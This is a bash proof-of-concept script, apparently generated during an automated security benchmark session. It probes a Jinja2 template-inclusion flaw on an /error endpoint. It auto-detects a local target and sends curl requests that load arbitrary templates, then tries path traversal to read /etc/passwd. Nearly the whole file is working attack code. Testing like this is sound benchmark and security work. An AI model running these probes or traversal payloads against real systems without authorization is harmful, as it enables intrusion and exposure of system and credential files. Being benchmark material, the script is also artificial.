#!/bin/bash
# POC: Improved SSTI POC with better error handling, auto-detection of target, and connectivity validation. Tests template enumeration and inclusion attacks on /error endpoint.
# Target: ./repo
# Created: 2025-11-07T16:16:22.390Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# Server-Side Template Injection (SSTI) via Unsafe Template Include - POC
# Vulnerability: /error endpoint accepts user-controlled 'error_type' parameter
# that is directly passed to Jinja2 {% include %} directive

# Auto-detect target from common ports or use provided argument
if [ -n "$1" ]; then
    TARGET_URL="$1"
else
    # Try to find running service on common ports
    for port in 8080 5000 3000 80; do
        if curl -s --connect-timeout 2 "http://localhost:$port/" > /dev/null 2>&1; then
            TARGET_URL="http://localhost:$port"
            echo "[*] Auto-detected service on port $port"
            break
        fi
    done
fi

if [ -z "$TARGET_URL" ]; then
    echo "[ERROR] Could not detect target URL. Please provide target URL as argument:"
    echo "Usage: $0 <target_url>"
    echo "Example: $0 http://localhost:8080"
    exit 1
fi

echo "[*] Testing SSTI vulnerability on /error endpoint"
echo "[*] Target: $TARGET_URL"
echo ""

# First, verify the target is reachable
echo "[*] Verifying target connectivity..."
if ! curl -s --connect-timeout 5 "$TARGET_URL/" > /dev/null 2>&1; then
    echo "[ERROR] Target URL is not reachable: $TARGET_URL"
    exit 1
fi
echo "[+] Target is reachable"
echo ""

# Test 1: Try to include a known template - not_implemented.html
echo "[TEST 1] Attempting to include 'not_implemented.html' template"
RESPONSE1=$(curl -s -w "\n%{http_code}" "$TARGET_URL/error?error_type=not_implemented.html&error_message=test" 2>&1)
HTTP_CODE1=$(echo "$RESPONSE1" | tail -n 1)
BODY1=$(echo "$RESPONSE1" | head -n -1)

echo "HTTP Status: $HTTP_CODE1"
echo "Response length: $(echo "$BODY1" | wc -c) bytes"
if [ "$HTTP_CODE1" = "200" ]; then
    echo "[+] HTTP 200 received"
    if echo "$BODY1" | grep -qi "not_implemented"; then
        echo "[+] SUCCESS: 'not_implemented' content found in response"
    elif echo "$BODY1" | grep -qi "html\|template\|error"; then
        echo "[+] Template response received with HTML/error content"
    else
        echo "[+] Response received (may be template inclusion)"
    fi
else
    echo "[-] Expected HTTP 200, got $HTTP_CODE1"
fi
echo ""

# Test 2: Try to include login.html template
echo "[TEST 2] Attempting to include 'login.html' template"
RESPONSE2=$(curl -s -w "\n%{http_code}" "$TARGET_URL/error?error_type=login.html&error_message=test" 2>&1)
HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)
BODY2=$(echo "$RESPONSE2" | head -n -1)

echo "HTTP Status: $HTTP_CODE2"
if [ "$HTTP_CODE2" = "200" ]; then
    echo "[+] HTTP 200 received"
    if echo "$BODY2" | grep -qi "password\|login\|username\|form"; then
        echo "[+] SUCCESS: Login form content found in response (template inclusion confirmed)"
    else
        echo "[+] Response received"
    fi
else
    echo "[-] Expected HTTP 200, got $HTTP_CODE2"
fi
echo ""

# Test 3: Try to include a non-existent template to trigger Jinja2 error
echo "[TEST 3] Attempting to include non-existent template 'xyz123nonexist.html' (should trigger error)"
RESPONSE3=$(curl -s -w "\n%{http_code}" "$TARGET_URL/error?error_type=xyz123nonexist.html&error_message=test" 2>&1)
HTTP_CODE3=$(echo "$RESPONSE3" | tail -n 1)
BODY3=$(echo "$RESPONSE3" | head -n -1)

echo "HTTP Status: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "500" ]; then
    echo "[+] Server returned 500 error - confirms Jinja2 processing of include directive"
    if echo "$BODY3" | grep -qi "jinja2\|template\|TemplateNotFound"; then
        echo "[+] ERROR contains Jinja2/template references - VULNERABILITY CONFIRMED"
    fi
elif [ "$HTTP_CODE3" = "404" ]; then
    echo "[+] Server returned 404 - endpoint or template not found"
elif [ "$HTTP_CODE3" = "200" ]; then
    echo "[+] Server returned 200 - may have error handling"
fi
echo ""

# Test 4: Attempt path traversal to access files outside template directory
echo "[TEST 4] Attempting path traversal '../../../etc/passwd'"
RESPONSE4=$(curl -s -w "\n%{http_code}" "$TARGET_URL/error?error_type=../../../etc/passwd&error_message=test" 2>&1)
HTTP_CODE4=$(echo "$RESPONSE4" | tail -n 1)
BODY4=$(echo "$RESPONSE4" | head -n -1)

echo "HTTP Status: $HTTP_CODE4"
if [ "$HTTP_CODE4" = "400" ]; then
    echo "[+] Server blocked path traversal with 400 error (some validation exists)"
    if echo "$BODY4" | grep -q "Invalid\|Error"; then
        echo "[+] Server returned validation error"
    fi
elif echo "$BODY4" | grep -q "root:\|nobody"; then
    echo "[!] CRITICAL: /etc/passwd content exposed!"
else
    echo "[-] Path traversal blocked or file not accessible (HTTP $HTTP_CODE4)"
fi
echo ""

# Test 5: Try direct comparison - include same template twice with different messages
echo "[TEST 5] Testing template inclusion consistency"
RESPONSE5A=$(curl -s "$TARGET_URL/error?error_type=login.html&error_message=msg1" 2>&1)
RESPONSE5B=$(curl -s "$TARGET_URL/error?error_type=login.html&error_message=msg2" 2>&1)

if echo "$RESPONSE5A" | grep -qi "msg1" && echo "$RESPONSE5B" | grep -qi "msg2"; then
    echo "[+] Error messages are reflected in responses"
    echo "[+] Template parameter appears to control which template is loaded"
    echo "[+] SSTI VULNERABILITY CONFIRMED"
elif [ "$(echo "$RESPONSE5A" | wc -c)" != "$(echo "$RESPONSE5B" | wc -c)" ]; then
    echo "[+] Responses differ based on error_type parameter - suggests template switching"
fi
echo ""

echo "[*] SSTI vulnerability testing complete"